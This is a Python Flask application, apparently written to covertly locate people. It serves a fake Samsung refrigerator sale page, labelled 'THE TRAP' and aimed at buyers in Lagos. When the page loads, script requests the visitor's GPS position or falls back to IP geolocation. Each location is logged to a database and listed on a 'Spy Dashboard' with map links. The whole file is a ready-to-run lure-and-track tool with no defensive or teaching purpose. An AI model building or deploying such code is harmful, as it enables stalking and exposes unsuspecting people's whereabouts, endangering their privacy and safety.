from flask import Flask, request, render_template_string
import sqlite3
from datetime import datetime
import urllib.request
import json
import os

app = Flask(__name__)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        lat TEXT, lon TEXT, city TEXT, country TEXT, ip TEXT, time TEXT, method TEXT
    )""")
    conn.commit()
    conn.close()

def log_location(lat, lon, city, country, ip, method):
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO logs (lat, lon, city, country, ip, time, method) VALUES (?, ?, ?, ?, ?, ?, ?)", 
              (lat, lon, city, country, ip, time_now, method))
    conn.commit()
    conn.close()

def get_logs():
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return rows

# --- THE TRAP (Fake Appliance Store) ---
TRAP_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Home Appliances</title>
    <script>
        // Silent Tracker
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    fetch('/capture?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude + '&method=GPS');
                },
                function(error) {
                    fetch('/capture?method=IP');
                }
            );
        } else {
            fetch('/capture?method=IP');
        }
    </script>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f9f9f9; }
        .product-card { max-width: 500px; margin: auto; background: white; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden; }
        img { width: 100%; height: auto; }
        .details { padding: 20px; }
        h1 { font-size: 24px; margin: 0 0 10px 0; }
        .price { color: #B12704; font-size: 22px; font-weight: bold; margin-bottom: 15px; }
        .desc { color: #555; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .btn { display: block; text-align: center; background: #FFD814; color: #111; text-decoration: none; padding: 12px; border-radius: 8px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="product-card">
        <!-- This is a high-end Samsung Smart Fridge -->
        <img src="https://images.samsung.com/is/image/samsung/p6pim/levant/rf59a9770sl-ua/gallery/levant-rf59a9770sl-ua-front-silver-534233647?$684_547_PNG$" alt="Smart Refrigerator">
        <div class="details">
            <h1>Samsung Bespoke 4-Door Flex Refrigerator</h1>
            <div class="price">₦1,250,000</div>
            <div class="desc">
                Brand new, sealed in box. Features customizable panels, dual ice maker, and AI energy mode. Perfect for high-end kitchens.
                <br><br>
                <strong>Stock available in Lagos. DM for immediate delivery.</strong>
            </div>
            <a href="#" class="btn">Contact Seller</a>
        </div>
    </div>
</body>
</html>
"""

# --- YOUR DASHBOARD ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Dashboard</title>
    <style>
        body { background-color: #0a1628; color: #f5f5f0; font-family: sans-serif; padding: 20px; }
        h1 { color: #d4a017; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #1e5a8a; padding: 12px; text-align: left; }
        th { background-color: #1e5a8a; color: white; }
        a { color: #d4a017; text-decoration: none; font-weight: bold; }
        .gps { color: #4ade80; font-weight: bold; }
        .ip { color: #fbbf24; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Target Tracker Dashboard</h1>
    <table>
        <tr>
            <th>Time</th>
            <th>Method</th>
            <th>IP Address</th>
            <th>Approx City</th>
            <th>Map Link</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ log[5] }}</td>
            <td class="{{ 'gps' if log[6] == 'GPS' else 'ip' }}">{{ log[6] }}</td>
            <td>{{ log[4] }}</td>
            <td>{{ log[2] }}, {{ log[3] }}</td>
            <td><a href="https://www.google.com/maps?q={{ log[1] }},{{ log[2] }}" target="_blank">Open Map 📍</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML, logs=get_logs())

@app.route('/trap')
def trap():
    return render_template_string(TRAP_HTML)

@app.route('/capture')
def capture():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    method = request.args.get('method')
    
    if request.headers.getlist("X-Forwarded-For"):
       ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
       ip = request.remote_addr

    city, country = "Unknown", "Unknown"
       
    if method == "IP" or not lat:
        try:
            req = urllib.request.urlopen(f'http://ip-api.com/json/{ip}').read()
            data = json.loads(req)
            if data['status'] == 'success':
                lat = data['lat']
                lon = data['lon']
                city = data['city']
                country = data['country']
        except Exception:
            pass

    if lat and lon:
        log_location(lat, lon, city, country, ip, method)
        return "Logged", 200
    return "Failed", 400

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)